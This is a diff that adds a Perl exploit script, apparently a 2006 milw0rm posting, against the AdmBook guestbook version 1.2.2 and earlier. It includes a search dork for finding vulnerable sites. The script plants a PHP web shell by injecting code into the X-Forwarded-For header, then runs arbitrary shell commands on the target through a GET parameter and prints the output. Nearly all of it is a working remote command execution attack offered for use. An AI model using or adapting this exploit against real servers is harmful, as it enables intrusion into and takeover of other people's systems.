@@ -1,0 +1,74 @@
+#!/usr/bin/perl -w
+use IO::Socket;
+
+print "*************************************************************************\r\n";
+print "|            Admbook <=1.2.2 X-Forwarded-For cmmnds xctn xploit        |\r\n";
+print "|                     By rgod rgod<AT>autistici<DOT>org                |\r\n";
+print "|                   site: http://retrogod.altervista.org               |\r\n";
+print "|                                                                      |\r\n";
+print "| Sun-Tzu: \"Rouse him, and learn the principle of his  activity  or    |\r\n";
+print "| inactivity.  Force him to reveal himself,  so as to find out  his    |\r\n";
+print "| vulnerable spots.\"                                                   |\r\n";
+print "*************************************************************************\r\n";
+print "| dork:  intitle:admbook intitle:version filetype:php                   |\r\n";
+print "*************************************************************************\r\n";
+sub main::urlEncode {
+    my ($string) = @_;
+    $string =~ s/(\W)/"%" . unpack("H2", $1)/ge;
+    #$string# =~ tr/.//;
+    return $string;
+ }
+
+$serv=$ARGV[0];
+$path=$ARGV[1];
+$cmd=""; for ($i=2; $i<=$#ARGV; $i++) {$cmd.="%20".urlEncode($ARGV[$i]);};
+
+if (@ARGV < 3)
+{
+print "Usage:\r\n";
+print "perl admbook_122_xpl.pl SERVER PATH COMMAND\r\n\r\n";
+print "SERVER         - Server where AdmBook is installed.\r\n";
+print "PATH           - Path to AdmBook (ex: /admbook/ or just /) \r\n";
+print "COMMAND        - A shell command \r\n";
+print "Example:\r\n";
+print "perl admbook_122_xpl.pl localhost /admbook/ ls -la\r\n";
+exit();
+}
+
+$sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$serv", Timeout  => 10, PeerPort=>"http(80)")
+or die "[+] Connecting ... Could not connect to host.\n\n";
+               
+$SHELL='";if (isset($_GET[CMD])){ECHO"Hi Master!";INI_SET("max_execution_time",0);PASSTHRU($_GET[CMD]);DIE;}echo"';
+$data="page=1";
+$data.="&name=whoami";
+$data.="&url=";
+$data.="&email=whoami\@SUNTZU.COM";
+$data.="&icq=";
+$message=urlEncode("I love italian guys!");
+$data.="&message=".$message;
+print $sock "POST ".$path."write.php HTTP/1.1\r\n";
+print $sock "Referer: http://".$serv.$path."index.php\r\n";
+print $sock "X-Forwarded-For: GUESS_WHAT:".$SHELL."\r\n";
+print $sock "Content-Type: application/x-www-form-urlencoded\r\n";
+print $sock "User-Agent: sun-tzu\r\n";
+print $sock "Content-Length: ".length($data)."\r\n";
+print $sock "Host: ".$serv."\r\n";
+print $sock "Connection: Close\r\n\r\n";
+print $sock $data;
+close($sock);
+
+sleep(2);
+
+$sock = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$serv", Timeout  => 10, PeerPort=>"http(80)")
+or die "[+] Connecting ... Could not connect to host.\n\n";
+
+print $sock "GET ".$path."content-data.php?CMD=".$cmd." HTTP/1.1\r\n";
+print $sock "Host: ".$serv."\r\n";
+print $sock "Connection: close\r\n\r\n";
+
+while ($answer = <$sock>) {
+  print $answer;
+}
+close($sock);
+
+# milw0rm.com [2006-02-19]
